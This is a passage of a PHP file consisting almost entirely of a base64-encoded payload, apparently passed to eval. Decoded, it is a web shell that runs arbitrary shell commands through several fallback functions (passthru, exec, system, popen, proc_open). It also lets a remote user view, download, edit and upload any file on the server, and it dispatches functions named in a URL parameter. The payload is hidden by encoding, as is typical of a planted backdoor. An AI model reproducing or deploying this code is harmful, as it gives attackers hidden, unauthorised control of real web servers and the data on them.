pPyggXCcoLispXCcpPy8nLCRjb21tYW5kLCRtYXRjaGVzKSkKICB7ICRmbGFncyA9ICcnOwogICAgaWYgKGlzc2V0KCRtYXRjaGVzWzFdKSkgJGZsYWdzID0gc3Vic3RyKCRtYXRjaGVzWzFdLDIpOwogICAgaWYgKGlzc2V0KCRtYXRjaGVzWzJdKSkgJHJlYWwgPSBleHBhbmQoJGhvbWUsJGRpciwkbWF0Y2hlc1szXSk7CiAgICBlbHNlICRyZWFsID0gcmVhbHBhdGgoJGRpcik7CiAgICBpZiAoIWZpbGVfZXhpc3RzKCRyZWFsKSkKICAgIHsgJG91dHB1dC49ImJhc2g6ICRjb21tYW5kKCRyZWFsKTogTm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeVxuIjsKICAgIH0KICAgIGVsc2UKICAgIHsgJG91dHB1dC49bHMoJGZsYWdzLCRyZWFsKTsKICAgIH0KICB9CiAgZWxzZQogIHsgY2hkaXIoJGRpcik7CiAgICAkb3V0cHV0PW15c2hlbGxleGVjKCRjb21tYW5kLiIgMj4mMSIpOwogIH0KICBpZiAoc3Vic3RyKCRkaXIsMCxzdHJsZW4oJGhvbWUpKT09JGhvbWUpICRkaXIgPSAnficuc3Vic3RyKCRkaXIsc3RybGVuKCRob21lKSk7CiAgJG91dHB1dCA9ICRwcm9jZXNzVXNlclsnbmFtZSddLidAJy5waHBfdW5hbWUoJ24nKS4nOicuJG9sZGRpci4nJCAnLiRjb21tYW5kLiJcbiIuJG91dHB1dDsKICBlY2hvIGpzb25fZW5jb2RlKGFycmF5KCdkaXInPT4kZGlyLCdvdXRwdXQnPT4kb3V0cHV0KSk7Cn0KCmZ1bmN0aW9uIG15c2hlbGxleGVjKCRjZmUpCnsgJHJlcyA9ICcnOwogIGlmICghZW1wdHkoJGNmZSkpCiAgeyBpZihAZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKQogICAgeyBAb2Jfc3RhcnQoKTsKICAgICAgQHBhc3N0aHJ1KCRjZmUpOwogICAgICAkcmVzID0gQG9iX2dldF9jb250ZW50cygpOwogICAgICBAb2JfZW5kX2NsZWFuKCk7CiAgICB9CiAgICBlbHNlaWYoQGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKQogICAgeyBAZXhlYygkY2ZlLCRyZXMpOwogICAgICAkcmVzID0gam9pbigiXG4iLCRyZXMpOwogICAgfQogICAgZWxzZWlmKEBmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkKICAgIHsgJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOwogICAgfQogICAgZWxzZWlmKEBmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKQogICAgeyBAb2Jfc3RhcnQoKTsKICAgICAgQHN5c3RlbSgkY2ZlKTsKICAgICAgJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKICAgICAgQG9iX2VuZF9jbGVhbigpOwogICAgfQogICAgZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKQogICAgeyAkcmVzID0gIiI7CiAgICAgIGlmIChAZnVuY3Rpb25fZXhpc3RzKCdmcmVhZCcpICYmQGZ1bmN0aW9uX2V4aXN0cygnZmVvZicpKQogICAgICB7IHdoaWxlKCFAZmVvZigkZikpIHskcmVzIC49IEBmcmVhZCgkZiwxMDI0KTt9CiAgICAgIH0KICAgICAgZWxzZWlmKEBmdW5jdGlvbl9leGlzdHMoJ2ZnZXRzJykgJiZAZnVuY3Rpb25fZXhpc3RzKCdmZW9mJykpCiAgICAgIHsgd2hpbGUoIUBmZW9mKCRmKSkgeyRyZXMgLj0gQGZnZXRzKCRmLDEwMjQpO30KICAgICAgfQogICAgICBAcGNsb3NlKCRmKTsKICAgIH0KICAgIGVsc2VpZihAaXNfcmVzb3VyY2UoJGYgPSBAcHJvY19vcGVuKCRjZmUsYXJyYXkoMSA9PmFycmF5KCJwaXBlIiwidyIpKSwkcGlwZXMpKSkKICAgIHsgJHJlcyA9ICIiOwogICAgICBpZihAZnVuY3Rpb25fZXhpc3RzKCdmcmVhZCcpICYmQGZ1bmN0aW9uX2V4aXN0cygnZmVvZicpKQogICAgICB7IHdoaWxlKCFAZmVvZigkcGlwZXNbMV0pKSB7JHJlcyAuPSBAZnJlYWQoJHBpcGVzWzFdLDEwMjQpO30KICAgICAgfQogICAgICBlbHNlaWYoQGZ1bmN0aW9uX2V4aXN0cygnZmdldHMnKSAmJkBmdW5jdGlvbl9leGlzdHMoJ2Zlb2YnKSkKICAgICAgeyB3aGlsZSghQGZlb2YoJHBpcGVzWzFdKSkgeyRyZXMgLj0gQGZnZXRzKCRwaXBlc1sxXSwxMDI0KTt9CiAgICAgIH0KICAgICAgQHByb2NfY2xvc2UoJGYpOwogICAgfQogIH0KICByZXR1cm4gJHJlczsKfQoKZnVuY3Rpb24gdmlldygpCnsgZ2xvYmFsICRob21lOwogIGlmICghaXNzZXQoJF9HRVRbJ2RpcmVjdG9yeSddKSkgZXJyb3JfZXhpdChmYWxzZSwnbm8gZGlyZWN0b3J5IHNwZWNpZmllZCcpOwogIGlmICghaXNzZXQoJF9HRVRbJ2FyZ3VtZW50J10pKSBlcnJvcl9leGl0KGZhbHNlLCdubyBhcmd1bWVudCBzcGVjaWZpZWQnKTsKICAkZGlyZWN0b3J5ID0gJF9HRVRbJ2RpcmVjdG9yeSddOwogICRhcmd1bWVudCA9ICRfR0VUWydhcmd1bWVudCddOwogICRmaWxlID0gZXhwYW5kKCRob21lLCRkaXJlY3RvcnksJGFyZ3VtZW50KTsKICAkYmFzZW5hbWUgPSBiYXNlbmFtZSgkZmlsZSk7CiAgaWYgKCFmaWxlX2V4aXN0cygkZmlsZSkpIGVycm9yX2V4aXQoZmFsc2UsJ2Nhbm5vdCBmaW5kIGZpbGUnKTsKICBpZiAoIWlzX2ZpbGUoJGZpbGUpKSBlcnJvcl9leGl0KGZhbHNlLCdhcmd1bWVudCBtdXN0IGJlIGEgZmlsZScpOwogICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGUpOwogIGlmIChzdHJwb3MoJGNvbnRlbnQsIlwwIik9PT1mYWxzZSkKICB7IGhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyk7CiAgICBlY2hvICRjb250ZW50OwogIH0KICBlbHNlIGlmICgkc2l6ZSA9IGdldGltYWdlc2l6ZSgkZmlsZSkpCiAgeyBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogJy4kc2l6ZVsnbWltZSddKTsKICAgIGVjaG8gJGNvbnRlbnQ7CiAgfQogIGVsc2UKICB7IGhlYWRlcigiUHJhZ21hOiBwdWJsaWMiKTsgLy8gcmVxdWlyZWQKICAgIGhlYWRlcigiRXhwaXJlczogMCIpOwogICAgaGVhZGVyKCJDYWNoZS1Db250cm9sOiBtdXN0LXJldmFsaWRhdGUsIHBvc3QtY2hlY2s9MCwgcHJlLWNoZWNrPTAiKTsKICAgIGhlYWRlcigiQ2FjaGUtQ29udHJvbDogcHJpdmF0ZSIsZmFsc2UpOyAvLyByZXF1aXJlZCBmb3IgY2VydGFpbiBicm93c2VycwogICAgaGVhZGVyKCJDb250ZW50LVR5cGU6ICIubWltZV9jb250ZW50X3R5cGUoJGJhc2VuYW1lKSk7CiAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPVwiJGJhc2VuYW1lXCIiKTsKICAgIGhlYWRlcigiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Iik7CiAgICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAiLnN0cmxlbigkY29udGVudCkpOwogICAgb2JfY2xlYW4oKTsKICAgIGZsdXNoKCk7CiAgICBlY2hvICRjb250ZW50OwogIH0KfQoKZnVuY3Rpb24gZG93bmxvYWQoKQp7IGdsb2JhbCAkaG9tZTsKICBpZiAoIWlzc2V0KCRfR0VUWydkaXJlY3RvcnknXSkpIGVycm9yX2V4aXQoZmFsc2UsJ25vIGRpcmVjdG9yeSBzcGVjaWZpZWQnKTsKICBpZiAoIWlzc2V0KCRfR0VUWydhcmd1bWVudCddKSkgZXJyb3JfZXhpdChmYWxzZSwnbm8gYXJndW1lbnQgc3BlY2lmaWVkJyk7CiAgJGRpcmVjdG9yeSA9ICRfR0VUWydkaXJlY3RvcnknXTsKICAkYXJndW1lbnQgPSAkX0dFVFsnYXJndW1lbnQnXTsKICAkZmlsZSA9IGV4cGFuZCgkaG9tZSwkZGlyZWN0b3J5LCRhcmd1bWVudCk7CiAgJGJhc2VuYW1lID0gYmFzZW5hbWUoJGZpbGUpOwogIGlmICghZmlsZV9leGlzdHMoJGZpbGUpKSBlcnJvcl9leGl0KGZhbHNlLCdjYW5ub3QgZmluZCBmaWxlJyk7CiAgaGVhZGVyKCJQcmFnbWE6IHB1YmxpYyIpOyAvLyByZXF1aXJlZAogIGhlYWRlcigiRXhwaXJlczogMCIpOwogIGhlYWRlcigiQ2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRlLCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0wIik7CiAgaGVhZGVyKCJDYWNoZS1Db250cm9sOiBwcml2YXRlIixmYWxzZSk7IC8vIHJlcXVpcmVkIGZvciBjZXJ0YWluIGJyb3dzZXJzCiAgaGVhZGVyKCJDb250ZW50LVR5cGU6ICIubWltZV9jb250ZW50X3R5cGUoJGJhc2VuYW1lKSk7CiAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1cIiRiYXNlbmFtZVwiIik7CiAgaGVhZGVyKCJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiaW5hcnkiKTsKICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAiLmZpbGVzaXplKCRmaWxlKSk7CiAgb2JfY2xlYW4oKTsKICBmbHVzaCgpOwogIHJlYWRmaWxlKCRmaWxlKTsKfQoKZnVuY3Rpb24gZWRpdCgpCnsgZ2xvYmFsICRob21lOwogIGdsb2JhbCAkc3R5bGU7CiAgZ2xvYmFsICRtaWNyb0FqYXg7CiAgaWYgKCFpc3NldCgkX0dFVFsnZGlyZWN0b3J5J10pKSBlcnJvcl9leGl0KGZhbHNlLCdubyBkaXJlY3Rvcnkgc3BlY2lmaWVkJyk7CiAgaWYgKCFpc3NldCgkX0dFVFsnYXJndW1lbnQnXSkpIGVycm9yX2V4aXQoZmFsc2UsJ25vIGFyZ3VtZW50IHNwZWNpZmllZCcpOwogICRkaXJlY3RvcnkgPSAkX0dFVFsnZGlyZWN0b3J5J107CiAgJGFyZ3VtZW50ID0gJF9HRVRbJ2FyZ3VtZW50J107CiAgJGZpbGUgPSBleHBhbmQoJGhvbWUsJGRpcmVjdG9yeSwkYXJndW1lbnQpOwogICRiYXNlbmFtZSA9IGJhc2VuYW1lKCRmaWxlKTsKICBpZiAoIWZpbGVfZXhpc3RzKCRmaWxlKSkgZXJyb3JfZXhpdChmYWxzZSwnY2Fubm90IGZpbmQgZmlsZScpOwogIGlmICghaXNfZmlsZSgkZmlsZSkpIGVycm9yX2V4aXQoZmFsc2UsJ2FyZ3VtZW50IG11c3QgYmUgYSBmaWxlJyk7CiAgaWYgKGlzc2V0KCRfUE9TVFsndGV4dCddKSkKICB7ICR0ZXh0ID0gJF9QT1NUWyd0ZXh0J107CiAgICBpZiAoZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJHRleHQpKSBkaWUoJ2ZpbGUgc2F2ZWQnKTsKICAgIGVsc2UgZGllKCdzYXZlIGZhaWxlZCcpOwogIH0KICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsKICBpZiAoc3RycG9zKCRjb250ZW50LCJcMCIpIT09ZmFsc2UpIGVycm9yX2V4aXQoZmFsc2UsJ2JpbmFyeSBmaWxlIGRldGVjdGVkJyk7CiAgJGNvbnRlbnQgPSBqc29uX2VuY29kZSgkY29udGVudCk7CiAgZWNobyA8PDxFTkRfT0ZfSFRNTAo8aHRtbD48aGVhZD4KPHN0eWxlPgokc3R5bGUKPC9zdHlsZT4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgp2YXIgY29udGVudCA9ICRjb250ZW50OwokbWljcm9BamF4CmZ1bmN0aW9uIGZvY3VzKCkKeyBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS5mb2N1cygpOwp9CmZ1bmN0aW9uIG9uZGF0YShzdHIpCnsgaGlzdG9yeS5nbygtMSk7Cn0KZnVuY3Rpb24gYWN0aXZhdGUoYSkKeyB2YXIgdGV4dCA9IGRvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzBdLnZhbHVlOwogIHRleHQgPSBlbmNvZGVVUklDb21wb25lbnQodGV4dCk7CiAgbWljcm9BamF4KGRvY3VtZW50LmxvY2F0aW9uLmhyZWYsIG9uZGF0YSwndGV4dD0nK3RleHQpOwogIHJldHVybiBmYWxzZTsKfQpkb2N1bWVudC5vbmNsaWNrID0gZm9jdXM7Cjwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5IG9ubG9hZD0iZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbMF0udmFsdWU9Y29udGVudDtkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS5zdHlsZS5kaXNwbGF5PSdibG9jayc7Ij48Zm9ybSBzdHlsZT0iZGlzcGxheTppbmxpbmU7Ij48dGV4dGFyZWEgc3R5bGU9InJlc2l6ZTpub25lO2JvcmRlcjowO2Rpc3BsYXk6bm9uZTt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2NvbG9yOmJsYWNrOyI+PC90ZXh0YXJlYT48ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTsgdG9wOjA7IHJpZ2h0OjA7Ij48ZGl2IHN0eWxlPSJtYXJnaW46IDhweDsgcGFkZGluZzogNXB4OyBib3JkZXI6MXB4IHNvbGlkIHNpbHZlcjsgYmFja2dyb3VuZDogd2hpdGU7Ij48c3BhbiBpZD0iYmFzZW5hbWUiPjxhIGhyZWY9IiMiIHRpdGxlPSJzYXZlIiBvbmNsaWNrPSJyZXR1cm4gYWN0aXZhdGUodGhpcykiPnNhdmU8L2E+PC9kaXY+PC9kaXY+PC9mb3JtPgo8L2JvZHk+PC9odG1sPgpFTkRfT0ZfSFRNTDsKfQoKZnVuY3Rpb24gZXJyb3JfZXhpdCgkc3VjY2VzcywkbWVzc2FnZSkKeyBnbG9iYWwgJHN0eWxlOwogICRyZXN1bHQgPSAkc3VjY2Vzcz8nU1VDQ0VFREVEJzonRkFJTEVEJzsKICAkYmFjayA9IGlzc2V0KCRfUE9TVFsnb3ZlcndyaXRlJ10pPzI6MTsKICBlY2hvIDw8PEVORF9PRl9IVE1MCjxodG1sPjxoZWFkPjxzdHlsZT4kc3R5bGU8L3N0eWxlPjwvaGVhZD48Ym9keT48cHJlPgokcmVzdWx0OiAkbWVzc2FnZQoKPGJ1dHRvbiBvbmNsaWNrPSJoaXN0b3J5LmdvKC0kYmFjayk7Ij5vazwvYnV0dG9uPjwvcHJlPjwvYm9keT48L2h0bWw+CkVORF9PRl9IVE1MOwogIGV4aXQ7Cn0KCmZ1bmN0aW9uIHVwbG9hZCgpCnsgZ2xvYmFsICRob21lOwogIGdsb2JhbCAkc3R5bGU7CiAgaWYgKCFpc3NldCgkX0dFVFsnZGlyZWN0b3J5J10pKSBlcnJvcl9leGl0KGZhbHNlLCdubyBkaXJlY3Rvcnkgc3BlY2lmaWVkJyk7CiAgJGRpcmVjdG9yeSA9ICRfR0VUWydkaXJlY3RvcnknXTsKICBpZiAoIWlzX3dyaXRhYmxlKCRkaXJlY3RvcnkpKSBlcnJvcl9leGl0KGZhbHNlLCd0YXJnZXQgZGlyZWN0b3J5IG5vdCB3cml0YWJsZScpOwogIGlmIChpc3NldCgkX1BPU1RbJ292ZXJ3cml0ZSddKSkKICB7ICRvdmVyd3JpdGUgPSAkX1BPU1RbJ292ZXJ3cml0ZSddPT0neWVzJzsKICAgICRlcnJvciA9ICRfRklMRVNbImZpbGUiXVsiZXJyb3IiXTsKICAgIGlmICgkZXJyb3IgPiAwKSAKICAgIHsgc3dpdGNoKCRlcnJvcikKICAgICAgeyBjYXNlIDE6IGVycm9yX2V4aXQoZmFsc2UsJ2ZpbGUgZXhjZWVkcyB0aGUgdXBsb2FkX21heF9maWxlc2l6ZScpOwogICAgICAgIGNhc2UgMjogZXJyb3JfZXhpdChmYWxzZSwnZmlsZSBleGNlZWRzIHRoZSBNQVhfRklMRV9TSVpFJyk7CiAgICAgICAgY2FzZSAzOiBlcnJvcl9leGl0KGZhbHNlLCdmaWxlIHdhcyBvbmx5IHBhcnRpYWxseSB1cGxvYWRlZCcpOwogICAgICAgIGNhc2UgNDogZXJyb3JfZXhpdChmYWxzZSwnbm8gZmlsZSB3YXMgdXBsb2FkZWQnKTsKICAgICAgICBjYXNlIDU6IGVycm9yX2V4aXQoZmFsc2UsJ21pc3NpbmcgYSB0ZW1wb3JhcnkgZm9sZGVyJyk7CiAgICAgICAgY2FzZSA2OiBlcnJvcl9leGl0KGZhbHNlLCdubyBmaWxlIHdhcyB1cGxvYWRlZCcpOwogICAgICAgIGNhc2UgNzogZXJyb3JfZXhpdChmYWxzZSwnZmFpbGVkIHRvIHdyaXRlIGZpbGUgdG8gZGlzaycpOwogICAgICAgIGNhc2UgODogZXJyb3JfZXhpdChmYWxzZSwnZmlsZSB1cGxvYWQgc3RvcHBlZCBieSBleHRlbnNpb24nKTsKICAgICAgICBkZWZhdWx0OiBlcnJvcl9leGl0KGZhbHNlLCd1cGxvYWQgZmFpbGVkJyk7CiAgICAgIH0KICAgIH0KICAgICRiYXNlbmFtZSA9ICRfRklMRVNbImZpbGUiXVsibmFtZSJdOwogICAgJGZpbGUgPSBleHBhbmQoJGhvbWUsJGRpcmVjdG9yeSwkYmFzZW5hbWUpOwogICAgaWYgKGZpbGVfZXhpc3RzKCRmaWxlKSAmJiAhJG92ZXJ3cml0ZSkgZXJyb3JfZXhpdChmYWxzZSwnZmlsZSBhbHJlYWR5IGV4aXN0cycpOwogICAgJHRtcCA9ICRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXTsKICAgIGlmICghbW92ZV91cGxvYWRlZF9maWxlKCR0bXAsJGZpbGUpKSBlcnJvcl9leGl0KGZhbHNlLCdmaWxlIGNhbm5vdCBiZSBtb3ZlZCcpOwogICAgZXJyb3JfZXhpdCh0cnVlLCdmaWxlIHVwbG9hZGVkJyk7CiAgfQogIGVjaG8gPDw8RU5EX09GX0hUTUwKPGh0bWw+PGhlYWQ+PHN0eWxlPiRzdHlsZTwvc3R5bGU+PC9oZWFkPjxib2R5Pgo8cHJlPjxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgc3R5bGU9ImRpc3BsYXk6aW5saW5lOyI+PGxhYmVsIGZvcj0idGFyZ2V0Ij50YXJnZXQgZGlyZWN0b3J5OjwvbGFiZWw+CjxpbnB1dCBuYW1lPSJ0YXJnZXQiIHR5cGU9InRleHQiIHZhbHVlPSIkZGlyZWN0b3J5LyIgZGlzYWJsZWQ9ImRpc2FibGVkIiBzaXplPSI0MCIvPgoKPGxhYmVsIGZvcj0iZmlsZSI+ZmlsZSB0byB1cGxvYWQ6PC9sYWJlbD4KPGlucHV0IG5hbWU9ImZpbGUiIHR5cGU9ImZpbGUiLz4KCjxsYWJlbCBmb3I9Im92ZXJ3cml0ZSI+b3ZlcndyaXRlIGlmIGZpbGUgZXhpc3RzPzwvbGFiZWw+CjxpbnB1dCBuYW1lPSJvdmVyd3JpdGUiIHR5cGU9InJhZGlvIiB2YWx1ZT0ieWVzIi8+IHllcwo8aW5wdXQgbmFtZT0ib3ZlcndyaXRlIiB0eXBlPSJyYWRpbyIgdmFsdWU9Im5vIiBjaGVja2VkPSJjaGVja2VkIi8+IG5vCgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ib2siLz4KCjwvZm9ybT48L3ByZT4KPC9ib2R5PjwvaHRtbD4KRU5EX09GX0hUTUw7CiAgZXhpdDsKfQoKJGFwcGxpY2F0aW9uID0gJ2Jhc2gnOwokYXBwbGljYXRpb25zID0gYXJyYXlfbWVyZ2UoJGNvbW1hbmRzLGFycmF5KCkpOwokYXBwbGljYXRpb25zW10gPSAnYmFzaCc7CiRhcHBsaWNhdGlvbnNbXSA9ICdjb21tYW5kJzsKaWYgKGlzc2V0KCRfR0VUWydhcHBsaWNhdGlvbiddKSkgJGFwcGxpY2F0aW9uID0gJF9HRVRbJ2FwcGxpY2F0aW9uJ107CmlmIChpbl9hcnJheSgkYXBwbGljYXRpb24sJGFwcGxpY2F0aW9ucykpIGNhbGxfdXNlcl9mdW5jKCRhcHBsaWNhdGlvbik7Cgo="));
?>
